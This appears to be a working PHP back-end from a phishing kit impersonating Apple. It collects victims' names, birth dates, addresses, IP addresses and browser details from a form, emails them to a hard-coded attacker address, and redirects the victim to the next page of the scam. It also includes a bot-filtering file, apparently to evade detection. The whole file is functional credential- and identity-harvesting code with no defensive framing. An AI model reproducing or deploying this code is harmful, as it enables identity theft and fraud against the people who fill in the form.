<?php
session_start(); 
include "../bots.php";

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+DJOU| BESMELLAH |DJOU+------------\n";
$bilsmg .= "First Name                   : ".$_POST['first']."\n";
$bilsmg .= "Last Name                    : ".$_POST['last']."\n";
$bilsmg .= "BirthDate Month             : ".$_POST['mon']."\n";
$bilsmg .= "BirthDate Day             : ".$_POST['day']."\n";
$bilsmg .= "BirthDate Year             : ".$_POST['yea']."\n";
$bilsmg .= "Adress1               : ".$_POST['address1']."/";
$bilsmg .= "|Adress2------: ".$_POST['address2']."<br>\n";
$bilsmg .= "|Country------: ".$_POST['country']."<br>\n";
$bilsmg .= "|State--------: ".$_POST['state']."<br>\n";
$bilsmg .= "|City---------: ".$_POST['city']."<br>\n";
$bilsmg .= "|ZIP Code-----: ".$_POST['zip']."<br>\n";

$bilsmg .= "------------+DJOU| HAMDOULELLEH |DJOU+------------\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";
$bilsmg .= "User Agent:  ".$_SERVER['HTTP_USER_AGENT']."\n";

$bilsnd = "yosrsafi@yahoo.fr";
$bilsub = "Apple INFO | From $ip";
$bilhead = "From:New INFO <support>";
$bilhead .= $_POST['yosrsafi@yahoo.fr']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../process1.php?dispatch={$_SESSION['DISPATCH_MD5_3']}";
header("location:$src");
?>